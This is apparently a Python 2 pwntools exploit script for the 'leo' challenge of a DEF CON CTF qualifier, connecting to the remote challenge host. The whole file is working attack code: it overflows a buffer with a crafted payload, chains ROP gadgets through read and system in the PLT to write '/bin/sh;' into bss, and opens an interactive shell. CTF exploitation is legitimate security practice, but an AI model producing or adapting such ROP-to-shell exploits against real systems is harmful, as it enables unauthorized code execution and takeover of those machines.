from pwn import *

#s = process("/root/leo")
s = remote("leo_33e299c29ed3f0113f3955a4c6b08500.quals.shallweplayaga.me",61111)
mprotect_plt = 0x0000000000401100
read_plt = 0x0000000000401090
poprdi = 0x0000000000402703
poprsi_r12 = 0x0000000000402701
bss = 0x6042B0
system_plt = 0x0000000000400FD0

raw_input("wait")
s.recvuntil("Bucko.\n\n")


payload = "\x00"*24 + p32(0x1f41) + p32(0x27272727) + "A"*8 + p64(poprdi) + p64(0)
payload += p64(poprsi_r12) + p64(bss) + p64(0)
payload += p64(read_plt) + p64(poprdi) + p64(bss) + p64(system_plt)

payload += "\x00"*(620-77)
payload += "\x01"*140
for i in range(2,256):
	payload += p32(i)[0]*59

payload = payload.ljust(16000,'\xff')
print len(payload)

s.send(payload)

s.send("/bin/sh;")
s.interactive()
raw_input("1234")
